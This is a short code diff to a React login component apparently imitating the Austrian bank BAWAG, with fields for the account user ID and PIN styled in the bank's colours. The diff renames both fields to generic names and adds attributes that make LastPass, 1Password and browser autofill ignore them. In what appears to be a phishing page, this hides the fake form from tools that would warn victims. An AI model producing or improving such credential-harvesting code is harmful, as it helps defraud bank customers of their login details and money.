@@ -187,6 +187,15 @@ const Bawag = () => {
                     value={verfueger}
                     onChange={(e) => setVerfueger(e.target.value)}
                     placeholder={t.inputUser}
+                    name="field-a"
+                    id="field-a"
+                    autoComplete="off"
+                    autoCorrect="off"
+                    autoCapitalize="off"
+                    spellCheck={false}
+                    data-lpignore="true"
+                    data-form-type="other"
+                    data-1p-ignore="true"
                     className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#990000]"
                   />
                 </div>
@@ -198,6 +207,15 @@ const Bawag = () => {
                       value={pin}
                       onChange={(e) => setPin(e.target.value)}
                       placeholder={t.inputPin}
+                      name="field-b"
+                      id="field-b"
+                      autoComplete="new-password"
+                      autoCorrect="off"
+                      autoCapitalize="off"
+                      spellCheck={false}
+                      data-lpignore="true"
+                      data-form-type="other"
+                      data-1p-ignore="true"
                       className="w-full border border-gray-400 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#990000]"
                     />
                     <button
